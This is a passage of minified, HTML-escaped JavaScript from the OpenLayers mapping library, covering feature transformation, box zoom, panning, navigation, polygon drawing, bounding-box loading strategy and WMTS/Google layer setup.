a},setMap:function(a){this.dragControl.setMap(a);OpenLayers.Control.prototype.setMap.apply(this,arguments)},setFeature:function(a,b){b=OpenLayers.Util.applyDefaults(b,{rotation:0,scale:1,ratio:1});var c=this.rotation,d=this.center;OpenLayers.Util.extend(this,b);if(!1!==this.events.triggerEvent("beforesetfeature",{feature:a})){this.feature=a;this.activate();this._setfeature=!0;var e=this.feature.geometry.getBounds();this.box.move(e.getCenterLonLat()); this.box.geometry.rotate(-c,d);this._angle=0;this.rotation?(c=a.geometry.clone(),c.rotate(-this.rotation,this.center),c=new OpenLayers.Feature.Vector(c.getBounds().toGeometry()),c.geometry.rotate(this.rotation,this.center),this.box.geometry.rotate(this.rotation,this.center),this.box.move(c.geometry.getBounds().getCenterLonLat()),c=c.geometry.components[0].components[0].getBounds().getCenterLonLat()):c=new OpenLayers.LonLat(e.left,e.bottom);this.handles[0].move(c);delete this._setfeature;this.events.triggerEvent("setfeature", {feature:a})}},unsetFeature:function(){this.active?this.deactivate():(this.feature=null,this.rotation=0,this.ratio=this.scale=1)},createBox:function(){var a=this;this.center=new OpenLayers.Geometry.Point(0,0);this.box=new OpenLayers.Feature.Vector(new OpenLayers.Geometry.LineString([new OpenLayers.Geometry.Point(-1,-1),new OpenLayers.Geometry.Point(0,-1),new OpenLayers.Geometry.Point(1,-1),new OpenLayers.Geometry.Point(1,0),new OpenLayers.Geometry.Point(1,1),new OpenLayers.Geometry.Point(0,1),new OpenLayers.Geometry.Point(-1, 1),new OpenLayers.Geometry.Point(-1,0),new OpenLayers.Geometry.Point(-1,-1)]),null,"string"==typeof this.renderIntent?null:this.renderIntent);this.box.geometry.move=function(b,c){a._moving=!0;OpenLayers.Geometry.LineString.prototype.move.apply(this,arguments);a.center.move(b,c);delete a._moving};for(var b=function(a,b){OpenLayers.Geometry.Point.prototype.move.apply(this,arguments);this._rotationHandle&amp;&amp;this._rotationHandle.geometry.move(a,b);this._handle.geometry.move(a,b)},c=function(a,b,c){OpenLayers.Geometry.Point.prototype.resize.apply(this, arguments);this._rotationHandle&amp;&amp;this._rotationHandle.geometry.resize(a,b,c);this._handle.geometry.resize(a,b,c)},d=function(a,b){OpenLayers.Geometry.Point.prototype.rotate.apply(this,arguments);this._rotationHandle&amp;&amp;this._rotationHandle.geometry.rotate(a,b);this._handle.geometry.rotate(a,b)},e=function(b,c){var d=this.x,e=this.y;OpenLayers.Geometry.Point.prototype.move.call(this,b,c);if(!a._moving){var f=a.dragControl.handlers.drag.evt,g=!(!a._setfeature&amp;&amp;a.preserveAspectRatio)&amp;&amp;!(f&amp;&amp;f.shiftKey), h=new OpenLayers.Geometry.Point(d,e),f=a.center;this.rotate(-a.rotation,f);h.rotate(-a.rotation,f);var k=this.x-f.x,l=this.y-f.y,m=k-(this.x-h.x),n=l-(this.y-h.y);a.irregular&amp;&amp;!a._setfeature&amp;&amp;(k-=(this.x-h.x)/2,l-=(this.y-h.y)/2);this.x=d;this.y=e;h=1;g?(l=1E-5>Math.abs(n)?1:l/n,h=(1E-5>Math.abs(m)?1:k/m)/l):(m=Math.sqrt(m*m+n*n),l=Math.sqrt(k*k+l*l)/m);a._moving=!0;a.box.geometry.rotate(-a.rotation,f);delete a._moving;a.box.geometry.resize(l,f,h);a.box.geometry.rotate(a.rotation,f);a.transformFeature({scale:l, ratio:h});a.irregular&amp;&amp;!a._setfeature&amp;&amp;(k=f.clone(),k.x+=1E-5>Math.abs(d-f.x)?0:this.x-d,k.y+=1E-5>Math.abs(e-f.y)?0:this.y-e,a.box.geometry.move(this.x-d,this.y-e),a.transformFeature({center:k}))}},f=function(b,c){var d=this.x,e=this.y;OpenLayers.Geometry.Point.prototype.move.call(this,b,c);if(!a._moving){var f=a.dragControl.handlers.drag.evt,f=f&amp;&amp;f.shiftKey?45:1,g=a.center,h=this.x-g.x,k=this.y-g.y;this.x=d;this.y=e;d=Math.atan2(k-c,h-b);d=Math.atan2(k,h)-d;d*=180/Math.PI;a._angle=(a._angle+d)% 360;d=a.rotation%f;if(Math.abs(a._angle)>=f||0!==d)d=Math.round(a._angle/f)*f-d,a._angle=0,a.box.geometry.rotate(d,g),a.transformFeature({rotation:d})}},g=Array(8),h=Array(4),k,l,m,n="sw s se e ne n nw w".split(" "),p=0;8>p;++p)k=this.box.geometry.components[p],l=new OpenLayers.Feature.Vector(k.clone(),{role:n[p]+"-resize"},"string"==typeof this.renderIntent?null:this.renderIntent),0==p%2&amp;&amp;(m=new OpenLayers.Feature.Vector(k.clone(),{role:n[p]+"-rotate"},"string"==typeof this.rotationHandleSymbolizer? null:this.rotationHandleSymbolizer),m.geometry.move=f,k._rotationHandle=m,h[p/2]=m),k.move=b,k.resize=c,k.rotate=d,l.geometry.move=e,k._handle=l,g[p]=l;this.rotationHandles=h;this.handles=g},createControl:function(){var a=this;this.dragControl=new OpenLayers.Control.DragFeature(this.layer,{documentDrag:!0,moveFeature:function(b){this.feature===a.feature&amp;&amp;(this.feature=a.box);OpenLayers.Control.DragFeature.prototype.moveFeature.apply(this,arguments)},onDrag:function(b,c){b===a.box&amp;&amp;a.transformFeature({center:a.center})}, onStart:function(b,c){var d=!a.geometryTypes||-1!==OpenLayers.Util.indexOf(a.geometryTypes,b.geometry.CLASS_NAME),e=OpenLayers.Util.indexOf(a.handles,b),e=e+OpenLayers.Util.indexOf(a.rotationHandles,b);b!==a.feature&amp;&amp;(b!==a.box&amp;&amp;-2==e&amp;&amp;d)&amp;&amp;a.setFeature(b)},onComplete:function(b,c){a.events.triggerEvent("transformcomplete",{feature:a.feature})}})},drawHandles:function(){for(var a=this.layer,b=0;8>b;++b)this.rotate&amp;&amp;0===b%2&amp;&amp;a.drawFeature(this.rotationHandles[b/2],this.rotationHandleSymbolizer),a.drawFeature(this.handles[b], this.renderIntent)},transformFeature:function(a){if(!this._setfeature){this.scale*=a.scale||1;this.ratio*=a.ratio||1;var b=this.rotation;this.rotation=(this.rotation+(a.rotation||0))%360;if(!1!==this.events.triggerEvent("beforetransform",a)){var c=this.feature,d=c.geometry,e=this.center;d.rotate(-b,e);a.scale||a.ratio?d.resize(a.scale,e,a.ratio):a.center&amp;&amp;c.move(a.center.getBounds().getCenterLonLat());d.rotate(this.rotation,e);this.layer.drawFeature(c);c.toState(OpenLayers.State.UPDATE);this.events.triggerEvent("transform", a)}}this.layer.drawFeature(this.box,this.renderIntent);this.drawHandles()},destroy:function(){for(var a,b=0;8>b;++b)a=this.box.geometry.components[b],a._handle.destroy(),a._handle=null,a._rotationHandle&amp;&amp;a._rotationHandle.destroy(),a._rotationHandle=null;this.rotationHandles=this.rotationHandleSymbolizer=this.handles=this.feature=this.center=null;this.box.destroy();this.layer=this.box=null;this.dragControl.destroy();this.dragControl=null;OpenLayers.Control.prototype.destroy.apply(this,arguments)}, CLASS_NAME:"OpenLayers.Control.TransformFeature"});OpenLayers.Handler.Box=OpenLayers.Class(OpenLayers.Handler,{dragHandler:null,boxDivClassName:"olHandlerBoxZoomBox",boxOffsets:null,initialize:function(a,b,c){OpenLayers.Handler.prototype.initialize.apply(this,arguments);this.dragHandler=new OpenLayers.Handler.Drag(this,{down:this.startBox,move:this.moveBox,out:this.removeBox,up:this.endBox},{keyMask:this.keyMask})},destroy:function(){OpenLayers.Handler.prototype.destroy.apply(this,arguments);this.dragHandler&amp;&amp;(this.dragHandler.destroy(),this.dragHandler= null)},setMap:function(a){OpenLayers.Handler.prototype.setMap.apply(this,arguments);this.dragHandler&amp;&amp;this.dragHandler.setMap(a)},startBox:function(a){this.callback("start",[]);this.zoomBox=OpenLayers.Util.createDiv("zoomBox",{x:-9999,y:-9999});this.zoomBox.className=this.boxDivClassName;this.zoomBox.style.zIndex=this.map.Z_INDEX_BASE.Popup-1;this.map.viewPortDiv.appendChild(this.zoomBox);OpenLayers.Element.addClass(this.map.viewPortDiv,"olDrawBox")},moveBox:function(a){var b=this.dragHandler.start.x, c=this.dragHandler.start.y,d=Math.abs(b-a.x),e=Math.abs(c-a.y),f=this.getBoxOffsets();this.zoomBox.style.width=d+f.width+1+"px";this.zoomBox.style.height=e+f.height+1+"px";this.zoomBox.style.left=(a.x&lt;b?b-d-f.left:b-f.left)+"px";this.zoomBox.style.top=(a.y&lt;c?c-e-f.top:c-f.top)+"px"},endBox:function(a){var b;if(5&lt;Math.abs(this.dragHandler.start.x-a.x)||5&lt;Math.abs(this.dragHandler.start.y-a.y)){var c=this.dragHandler.start;b=Math.min(c.y,a.y);var d=Math.max(c.y,a.y),e=Math.min(c.x,a.x);a=Math.max(c.x, a.x);b=new OpenLayers.Bounds(e,d,a,b)}else b=this.dragHandler.start.clone();this.removeBox();this.callback("done",[b])},removeBox:function(){this.map.viewPortDiv.removeChild(this.zoomBox);this.boxOffsets=this.zoomBox=null;OpenLayers.Element.removeClass(this.map.viewPortDiv,"olDrawBox")},activate:function(){return OpenLayers.Handler.prototype.activate.apply(this,arguments)?(this.dragHandler.activate(),!0):!1},deactivate:function(){return OpenLayers.Handler.prototype.deactivate.apply(this,arguments)? (this.dragHandler.deactivate()&amp;&amp;this.zoomBox&amp;&amp;this.removeBox(),!0):!1},getBoxOffsets:function(){if(!this.boxOffsets){var a=document.createElement("div");a.style.position="absolute";a.style.border="1px solid black";a.style.width="3px";document.body.appendChild(a);var b=3==a.clientWidth;document.body.removeChild(a);var a=parseInt(OpenLayers.Element.getStyle(this.zoomBox,"border-left-width")),c=parseInt(OpenLayers.Element.getStyle(this.zoomBox,"border-right-width")),d=parseInt(OpenLayers.Element.getStyle(this.zoomBox, "border-top-width")),e=parseInt(OpenLayers.Element.getStyle(this.zoomBox,"border-bottom-width"));this.boxOffsets={left:a,right:c,top:d,bottom:e,width:!1===b?a+c:0,height:!1===b?d+e:0}}return this.boxOffsets},CLASS_NAME:"OpenLayers.Handler.Box"});OpenLayers.Control.ZoomBox=OpenLayers.Class(OpenLayers.Control,{type:OpenLayers.Control.TYPE_TOOL,out:!1,keyMask:null,alwaysZoom:!1,zoomOnClick:!0,draw:function(){this.handler=new OpenLayers.Handler.Box(this,{done:this.zoomBox},{keyMask:this.keyMask})},zoomBox:function(a){if(a instanceof OpenLayers.Bounds){var b,c=a.getCenterPixel();if(this.out){b=Math.min(this.map.size.h/(a.bottom-a.top),this.map.size.w/(a.right-a.left));var d=this.map.getExtent(),e=this.map.getLonLatFromPixel(c),f=e.lon-d.getWidth()/ 2*b;a=e.lon+d.getWidth()/2*b;var g=e.lat-d.getHeight()/2*b;b=e.lat+d.getHeight()/2*b;b=new OpenLayers.Bounds(f,g,a,b)}else f=this.map.getLonLatFromPixel({x:a.left,y:a.bottom}),a=this.map.getLonLatFromPixel({x:a.right,y:a.top}),b=new OpenLayers.Bounds(f.lon,f.lat,a.lon,a.lat);f=this.map.getZoom();g=this.map.getSize();a=g.w/2;g=g.h/2;b=this.map.getZoomForExtent(b);d=this.map.getResolution();e=this.map.getResolutionForZoom(b);d==e?this.map.setCenter(this.map.getLonLatFromPixel(c)):this.map.zoomTo(b, {x:(d*c.x-e*a)/(d-e),y:(d*c.y-e*g)/(d-e)});f==this.map.getZoom()&amp;&amp;!0==this.alwaysZoom&amp;&amp;this.map.zoomTo(f+(this.out?-1:1))}else this.zoomOnClick&amp;&amp;(this.out?this.map.zoomTo(this.map.getZoom()-1,a):this.map.zoomTo(this.map.getZoom()+1,a))},CLASS_NAME:"OpenLayers.Control.ZoomBox"});OpenLayers.Control.DragPan=OpenLayers.Class(OpenLayers.Control,{type:OpenLayers.Control.TYPE_TOOL,panned:!1,interval:0,documentDrag:!1,kinetic:null,enableKinetic:!0,kineticInterval:10,draw:function(){if(this.enableKinetic&amp;&amp;OpenLayers.Kinetic){var a={interval:this.kineticInterval};"object"===typeof this.enableKinetic&amp;&amp;(a=OpenLayers.Util.extend(a,this.enableKinetic));this.kinetic=new OpenLayers.Kinetic(a)}this.handler=new OpenLayers.Handler.Drag(this,{move:this.panMap,done:this.panMapDone,down:this.panMapStart}, {interval:this.interval,documentDrag:this.documentDrag})},panMapStart:function(){this.kinetic&amp;&amp;this.kinetic.begin()},panMap:function(a){this.kinetic&amp;&amp;this.kinetic.update(a);this.panned=!0;this.map.pan(this.handler.last.x-a.x,this.handler.last.y-a.y,{dragging:!0,animate:!1})},panMapDone:function(a){if(this.panned){var b=null;this.kinetic&amp;&amp;(b=this.kinetic.end(a));this.map.pan(this.handler.last.x-a.x,this.handler.last.y-a.y,{dragging:!!b,animate:!1});if(b){var c=this;this.kinetic.move(b,function(a,b, f){c.map.pan(a,b,{dragging:!f,animate:!1})})}this.panned=!1}},CLASS_NAME:"OpenLayers.Control.DragPan"});OpenLayers.Control.Navigation=OpenLayers.Class(OpenLayers.Control,{dragPan:null,dragPanOptions:null,pinchZoom:null,pinchZoomOptions:null,documentDrag:!1,zoomBox:null,zoomBoxEnabled:!0,zoomWheelEnabled:!0,mouseWheelOptions:null,handleRightClicks:!1,zoomBoxKeyMask:OpenLayers.Handler.MOD_SHIFT,autoActivate:!0,initialize:function(a){this.handlers={};OpenLayers.Control.prototype.initialize.apply(this,arguments)},destroy:function(){this.deactivate();this.dragPan&amp;&amp;this.dragPan.destroy();this.dragPan=null; this.zoomBox&amp;&amp;this.zoomBox.destroy();this.zoomBox=null;this.pinchZoom&amp;&amp;this.pinchZoom.destroy();this.pinchZoom=null;OpenLayers.Control.prototype.destroy.apply(this,arguments)},activate:function(){this.dragPan.activate();this.zoomWheelEnabled&amp;&amp;this.handlers.wheel.activate();this.handlers.click.activate();this.zoomBoxEnabled&amp;&amp;this.zoomBox.activate();this.pinchZoom&amp;&amp;this.pinchZoom.activate();return OpenLayers.Control.prototype.activate.apply(this,arguments)},deactivate:function(){this.pinchZoom&amp;&amp;this.pinchZoom.deactivate(); this.zoomBox.deactivate();this.dragPan.deactivate();this.handlers.click.deactivate();this.handlers.wheel.deactivate();return OpenLayers.Control.prototype.deactivate.apply(this,arguments)},draw:function(){this.handleRightClicks&amp;&amp;(this.map.viewPortDiv.oncontextmenu=OpenLayers.Function.False);this.handlers.click=new OpenLayers.Handler.Click(this,{click:this.defaultClick,dblclick:this.defaultDblClick,dblrightclick:this.defaultDblRightClick},{"double":!0,stopDouble:!0});this.dragPan=new OpenLayers.Control.DragPan(OpenLayers.Util.extend({map:this.map, documentDrag:this.documentDrag},this.dragPanOptions));this.zoomBox=new OpenLayers.Control.ZoomBox({map:this.map,keyMask:this.zoomBoxKeyMask});this.dragPan.draw();this.zoomBox.draw();this.handlers.wheel=new OpenLayers.Handler.MouseWheel(this,{up:this.wheelUp,down:this.wheelDown},OpenLayers.Util.extend(this.map.fractionalZoom?{}:{cumulative:!1,interval:50,maxDelta:6},this.mouseWheelOptions));OpenLayers.Control.PinchZoom&amp;&amp;(this.pinchZoom=new OpenLayers.Control.PinchZoom(OpenLayers.Util.extend({map:this.map}, this.pinchZoomOptions)))},defaultClick:function(a){a.lastTouches&amp;&amp;2==a.lastTouches.length&amp;&amp;this.map.zoomOut()},defaultDblClick:function(a){this.map.zoomTo(this.map.zoom+1,a.xy)},defaultDblRightClick:function(a){this.map.zoomTo(this.map.zoom-1,a.xy)},wheelChange:function(a,b){this.map.fractionalZoom||(b=Math.round(b));var c=this.map.getZoom(),d;d=Math.max(c+b,0);d=Math.min(d,this.map.getNumZoomLevels());d!==c&amp;&amp;this.map.zoomTo(d,a.xy)},wheelUp:function(a,b){this.wheelChange(a,b||1)},wheelDown:function(a, b){this.wheelChange(a,b||-1)},disableZoomBox:function(){this.zoomBoxEnabled=!1;this.zoomBox.deactivate()},enableZoomBox:function(){this.zoomBoxEnabled=!0;this.active&amp;&amp;this.zoomBox.activate()},disableZoomWheel:function(){this.zoomWheelEnabled=!1;this.handlers.wheel.deactivate()},enableZoomWheel:function(){this.zoomWheelEnabled=!0;this.active&amp;&amp;this.handlers.wheel.activate()},CLASS_NAME:"OpenLayers.Control.Navigation"});OpenLayers.Control.DrawFeature=OpenLayers.Class(OpenLayers.Control,{layer:null,callbacks:null,multi:!1,featureAdded:function(){},initialize:function(a,b,c){OpenLayers.Control.prototype.initialize.apply(this,[c]);this.callbacks=OpenLayers.Util.extend({done:this.drawFeature,modify:function(a,b){this.layer.events.triggerEvent("sketchmodified",{vertex:a,feature:b})},create:function(a,b){this.layer.events.triggerEvent("sketchstarted",{vertex:a,feature:b})}},this.callbacks);this.layer=a;this.handlerOptions= this.handlerOptions||{};this.handlerOptions.layerOptions=OpenLayers.Util.applyDefaults(this.handlerOptions.layerOptions,{renderers:a.renderers,rendererOptions:a.rendererOptions});"multi"in this.handlerOptions||(this.handlerOptions.multi=this.multi);if(a=this.layer.styleMap&amp;&amp;this.layer.styleMap.styles.temporary)this.handlerOptions.layerOptions=OpenLayers.Util.applyDefaults(this.handlerOptions.layerOptions,{styleMap:new OpenLayers.StyleMap({"default":a})});this.handler=new b(this,this.callbacks,this.handlerOptions)}, drawFeature:function(a){a=new OpenLayers.Feature.Vector(a);!1!==this.layer.events.triggerEvent("sketchcomplete",{feature:a})&amp;&amp;(a.state=OpenLayers.State.INSERT,this.layer.addFeatures([a]),this.featureAdded(a),this.events.triggerEvent("featureadded",{feature:a}))},insertXY:function(a,b){this.handler&amp;&amp;this.handler.line&amp;&amp;this.handler.insertXY(a,b)},insertDeltaXY:function(a,b){this.handler&amp;&amp;this.handler.line&amp;&amp;this.handler.insertDeltaXY(a,b)},insertDirectionLength:function(a,b){this.handler&amp;&amp;this.handler.line&amp;&amp; this.handler.insertDirectionLength(a,b)},insertDeflectionLength:function(a,b){this.handler&amp;&amp;this.handler.line&amp;&amp;this.handler.insertDeflectionLength(a,b)},undo:function(){return this.handler.undo&amp;&amp;this.handler.undo()},redo:function(){return this.handler.redo&amp;&amp;this.handler.redo()},finishSketch:function(){this.handler.finishGeometry()},cancel:function(){this.handler.cancel()},CLASS_NAME:"OpenLayers.Control.DrawFeature"});OpenLayers.Handler.Polygon=OpenLayers.Class(OpenLayers.Handler.Path,{holeModifier:null,drawingHole:!1,polygon:null,createFeature:function(a){a=this.layer.getLonLatFromViewPortPx(a);a=new OpenLayers.Geometry.Point(a.lon,a.lat);this.point=new OpenLayers.Feature.Vector(a);this.line=new OpenLayers.Feature.Vector(new OpenLayers.Geometry.LinearRing([this.point.geometry]));this.polygon=new OpenLayers.Feature.Vector(new OpenLayers.Geometry.Polygon([this.line.geometry]));this.callback("create",[this.point.geometry, this.getSketch()]);this.point.geometry.clearBounds();this.layer.addFeatures([this.polygon,this.point],{silent:!0})},addPoint:function(a){if(!this.drawingHole&amp;&amp;this.holeModifier&amp;&amp;this.evt&amp;&amp;this.evt[this.holeModifier])for(var b=this.point.geometry,c=this.control.layer.features,d,e=c.length-1;0&lt;=e;--e)if(d=c[e].geometry,(d instanceof OpenLayers.Geometry.Polygon||d instanceof OpenLayers.Geometry.MultiPolygon)&amp;&amp;d.intersects(b)){b=c[e];this.control.layer.removeFeatures([b],{silent:!0});this.control.layer.events.registerPriority("sketchcomplete", this,this.finalizeInteriorRing);this.control.layer.events.registerPriority("sketchmodified",this,this.enforceTopology);b.geometry.addComponent(this.line.geometry);this.polygon=b;this.drawingHole=!0;break}OpenLayers.Handler.Path.prototype.addPoint.apply(this,arguments)},getCurrentPointIndex:function(){return this.line.geometry.components.length-2},enforceTopology:function(a){a=a.vertex;var b=this.line.geometry.components;this.polygon.geometry.intersects(a)||(b=b[b.length-3],a.x=b.x,a.y=b.y)},finishGeometry:function(){this.line.geometry.removeComponent(this.line.geometry.components[this.line.geometry.components.length- 2]);this.removePoint();this.finalize()},finalizeInteriorRing:function(){var a=this.line.geometry,b=0!==a.getArea();if(b){for(var c=this.polygon.geometry.components,d=c.length-2;0&lt;=d;--d)if(a.intersects(c[d])){b=!1;break}if(b)a:for(d=c.length-2;0&lt;d;--d)for(var e=c[d].components,f=0,g=e.length;f&lt;g;++f)if(a.containsPoint(e[f])){b=!1;break a}}b?this.polygon.state!==OpenLayers.State.INSERT&amp;&amp;(this.polygon.state=OpenLayers.State.UPDATE):this.polygon.geometry.removeComponent(a);this.restoreFeature();return!1}, cancel:function(){this.drawingHole&amp;&amp;(this.polygon.geometry.removeComponent(this.line.geometry),this.restoreFeature(!0));return OpenLayers.Handler.Path.prototype.cancel.apply(this,arguments)},restoreFeature:function(a){this.control.layer.events.unregister("sketchcomplete",this,this.finalizeInteriorRing);this.control.layer.events.unregister("sketchmodified",this,this.enforceTopology);this.layer.removeFeatures([this.polygon],{silent:!0});this.control.layer.addFeatures([this.polygon],{silent:!0});this.drawingHole= !1;a||this.control.layer.events.triggerEvent("sketchcomplete",{feature:this.polygon})},destroyFeature:function(a){OpenLayers.Handler.Path.prototype.destroyFeature.call(this,a);this.polygon=null},drawFeature:function(){this.layer.drawFeature(this.polygon,this.style);this.layer.drawFeature(this.point,this.style)},getSketch:function(){return this.polygon},getGeometry:function(){var a=this.polygon&amp;&amp;this.polygon.geometry;a&amp;&amp;this.multi&amp;&amp;(a=new OpenLayers.Geometry.MultiPolygon([a]));return a},CLASS_NAME:"OpenLayers.Handler.Polygon"});OpenLayers.Control.EditingToolbar=OpenLayers.Class(OpenLayers.Control.Panel,{citeCompliant:!1,initialize:function(a,b){OpenLayers.Control.Panel.prototype.initialize.apply(this,[b]);this.addControls([new OpenLayers.Control.Navigation]);var c=[new OpenLayers.Control.DrawFeature(a,OpenLayers.Handler.Point,{displayClass:"olControlDrawFeaturePoint",handlerOptions:{citeCompliant:this.citeCompliant}}),new OpenLayers.Control.DrawFeature(a,OpenLayers.Handler.Path,{displayClass:"olControlDrawFeaturePath",handlerOptions:{citeCompliant:this.citeCompliant}}), new OpenLayers.Control.DrawFeature(a,OpenLayers.Handler.Polygon,{displayClass:"olControlDrawFeaturePolygon",handlerOptions:{citeCompliant:this.citeCompliant}})];this.addControls(c)},draw:function(){var a=OpenLayers.Control.Panel.prototype.draw.apply(this,arguments);null===this.defaultControl&amp;&amp;(this.defaultControl=this.controls[0]);return a},CLASS_NAME:"OpenLayers.Control.EditingToolbar"});OpenLayers.Strategy.BBOX=OpenLayers.Class(OpenLayers.Strategy,{bounds:null,resolution:null,ratio:2,resFactor:null,response:null,activate:function(){var a=OpenLayers.Strategy.prototype.activate.call(this);a&amp;&amp;(this.layer.events.on({moveend:this.update,refresh:this.update,visibilitychanged:this.update,scope:this}),this.update());return a},deactivate:function(){var a=OpenLayers.Strategy.prototype.deactivate.call(this);a&amp;&amp;this.layer.events.un({moveend:this.update,refresh:this.update,visibilitychanged:this.update, scope:this});return a},update:function(a){var b=this.getMapBounds();null!==b&amp;&amp;(a&amp;&amp;a.force||this.layer.visibility&amp;&amp;this.layer.calculateInRange()&amp;&amp;this.invalidBounds(b))&amp;&amp;(this.calculateBounds(b),this.resolution=this.layer.map.getResolution(),this.triggerRead(a))},getMapBounds:function(){if(null===this.layer.map)return null;var a=this.layer.map.getExtent();a&amp;&amp;!this.layer.projection.equals(this.layer.map.getProjectionObject())&amp;&amp;(a=a.clone().transform(this.layer.map.getProjectionObject(),this.layer.projection)); return a},invalidBounds:function(a){a||(a=this.getMapBounds());a=!this.bounds||!this.bounds.containsBounds(a);!a&amp;&amp;this.resFactor&amp;&amp;(a=this.resolution/this.layer.map.getResolution(),a=a>=this.resFactor||a&lt;=1/this.resFactor);return a},calculateBounds:function(a){a||(a=this.getMapBounds());var b=a.getCenterLonLat(),c=a.getWidth()*this.ratio;a=a.getHeight()*this.ratio;this.bounds=new OpenLayers.Bounds(b.lon-c/2,b.lat-a/2,b.lon+c/2,b.lat+a/2)},triggerRead:function(a){!this.response||a&amp;&amp;!0===a.noAbort|| (this.layer.protocol.abort(this.response),this.layer.events.triggerEvent("loadend"));var b={filter:this.createFilter()};this.layer.events.triggerEvent("loadstart",b);this.response=this.layer.protocol.read(OpenLayers.Util.applyDefaults({filter:b.filter,callback:this.merge,scope:this},a))},createFilter:function(){var a=new OpenLayers.Filter.Spatial({type:OpenLayers.Filter.Spatial.BBOX,value:this.bounds,projection:this.layer.projection});this.layer.filter&amp;&amp;(a=new OpenLayers.Filter.Logical({type:OpenLayers.Filter.Logical.AND, filters:[this.layer.filter,a]}));return a},merge:function(a){this.layer.destroyFeatures();if(a.success()){var b=a.features;if(b&amp;&amp;0&lt;b.length){var c=this.layer.projection,d=this.layer.map.getProjectionObject();if(!d.equals(c))for(var e,f=0,g=b.length;f&lt;g;++f)(e=b[f].geometry)&amp;&amp;e.transform(c,d);this.layer.addFeatures(b)}}else this.bounds=null;this.response=null;this.layer.events.triggerEvent("loadend",{response:a})},CLASS_NAME:"OpenLayers.Strategy.BBOX"});OpenLayers.Layer.WorldWind=OpenLayers.Class(OpenLayers.Layer.Grid,{DEFAULT_PARAMS:{},isBaseLayer:!0,lzd:null,zoomLevels:null,initialize:function(a,b,c,d,e,f){this.lzd=c;this.zoomLevels=d;c=[];c.push(a,b,e,f);OpenLayers.Layer.Grid.prototype.initialize.apply(this,c);this.params=OpenLayers.Util.applyDefaults(this.params,this.DEFAULT_PARAMS)},getZoom:function(){var a=this.map.getZoom();this.map.getMaxExtent();return a-=Math.log(this.maxResolution/(this.lzd/512))/Math.log(2)},getURL:function(a){a=this.adjustBounds(a); var b=this.getZoom(),c=this.map.getMaxExtent(),d=this.lzd/Math.pow(2,this.getZoom()),e=Math.floor((a.left-c.left)/d);a=Math.floor((a.bottom-c.bottom)/d);return this.map.getResolution()&lt;=this.lzd/512&amp;&amp;this.getZoom()&lt;=this.zoomLevels?this.getFullRequestString({L:b,X:e,Y:a}):OpenLayers.Util.getImageLocation("blank.gif")},CLASS_NAME:"OpenLayers.Layer.WorldWind"});OpenLayers.Protocol.CSW=function(a){a=OpenLayers.Util.applyDefaults(a,OpenLayers.Protocol.CSW.DEFAULTS);var b=OpenLayers.Protocol.CSW["v"+a.version.replace(/\./g,"_")];if(!b)throw"Unsupported CSW version: "+a.version;return new b(a)};OpenLayers.Protocol.CSW.DEFAULTS={version:"2.0.2"};OpenLayers.Format.WMTSCapabilities=OpenLayers.Class(OpenLayers.Format.XML.VersionedOGC,{defaultVersion:"1.0.0",yx:{"urn:ogc:def:crs:EPSG::4326":!0},createLayer:function(a,b){if(!("layer"in b))throw Error("Missing property 'layer' in configuration.");for(var c=a.contents,d,e=0,f=c.layers.length;e&lt;f;++e)if(c.layers[e].identifier===b.layer){d=c.layers[e];break}if(!d)throw Error("Layer not found");var g=b.format;!g&amp;&amp;(d.formats&amp;&amp;d.formats.length)&amp;&amp;(g=d.formats[0]);var h;b.matrixSet?h=c.tileMatrixSets[b.matrixSet]: 1&lt;=d.tileMatrixSetLinks.length&amp;&amp;(h=c.tileMatrixSets[d.tileMatrixSetLinks[0].tileMatrixSet]);if(!h)throw Error("matrixSet not found");for(var k,e=0,f=d.styles.length;e&lt;f&amp;&amp;(k=d.styles[e],!k.isDefault);++e);c=b.requestEncoding;if(!c&amp;&amp;(c="KVP",a.operationsMetadata.GetTile.dcp.http)){var l=a.operationsMetadata.GetTile.dcp.http;l.get[0].constraints&amp;&amp;(l=l.get[0].constraints.GetEncoding.allowedValues,l.KVP||!l.REST&amp;&amp;!l.RESTful||(c="REST"))}var l=[],m=b.params||{};delete b.params;for(var n=0,p=d.dimensions.length;n&lt; p;n++){var q=d.dimensions[n];l.push(q.identifier);m.hasOwnProperty(q.identifier)||(m[q.identifier]=q["default"])}var n=b.projection||h.supportedCRS.replace(/urn:ogc:def:crs:(\w+):(.*:)?(\w+)$/,"$1:$3"),p=b.units||("EPSG:4326"===n?"degrees":"m"),q=[],r;for(r in h.matrixIds)h.matrixIds.hasOwnProperty(r)&amp;&amp;q.push(2.8E-4*h.matrixIds[r].scaleDenominator/OpenLayers.METERS_PER_INCH/OpenLayers.INCHES_PER_UNIT[p]);if("REST"===c&amp;&amp;d.resourceUrls){r=[];for(var f=0,s=d.resourceUrls.length;f&lt;s;++f)e=d.resourceUrls[f], e.format===g&amp;&amp;"tile"===e.resourceType&amp;&amp;r.push(e.template)}else{s=a.operationsMetadata.GetTile.dcp.http.get;r=[];for(var t,e=0,f=s.length;e&lt;f;e++)t=s[e].constraints,(!t||t&amp;&amp;t.GetEncoding.allowedValues[c])&amp;&amp;r.push(s[e].url)}return new OpenLayers.Layer.WMTS(OpenLayers.Util.applyDefaults(b,{url:r,requestEncoding:c,name:d.title,style:k.identifier,format:g,matrixIds:h.matrixIds,matrixSet:h.identifier,projection:n,units:p,resolutions:!1===b.isBaseLayer?void 0:q,serverResolutions:q,tileFullExtent:h.bounds, dimensions:l,params:m}))},CLASS_NAME:"OpenLayers.Format.WMTSCapabilities"});OpenLayers.Layer.Google.v3={DEFAULTS:{sphericalMercator:!0,projection:"EPSG:900913"},animationEnabled:!0,loadMapObject:function(){this.type||(this.type=google.maps.MapTypeId.ROADMAP);var a,b=OpenLayers.Layer.Google.cache[this.map.id];b?(a=b.mapObject,++b.count):(a=this.map.getCenter(),b=document.createElement("div"),b.className="olForeignContainer",b.style.width="100%",b.style.height="100%",a=new google.maps.Map(b,{center:a?new google.maps.LatLng(a.lat,a.lon):new google.maps.LatLng(0,0),zoom:this.map.getZoom()|| 0,mapTypeId:this.type,disableDefaultUI:!0,keyboardShortcuts:!1,draggable:!1,disableDoubleClickZoom:!0,scrollwheel:!1,streetViewControl:!1}),b=document.createElement("div"),b.style.width="100%",b.style.height="100%",a.controls[google.maps.ControlPosition.TOP_LEFT].push(b),b={googleControl:b,mapObject:a,count:1},OpenLayers.Layer.Google.cache[this.map.id]=b);this.mapObject=a;this.setGMapVisibility(this.visibility)},onMapResize:function(){this.visibility&amp;&amp;google.maps.event.trigger(this.mapObject,"resize")}, setGMapVisibility:function(a){var b=OpenLayers.Layer.Google.cache[this.map.id],c=this.map;if(b){for(var 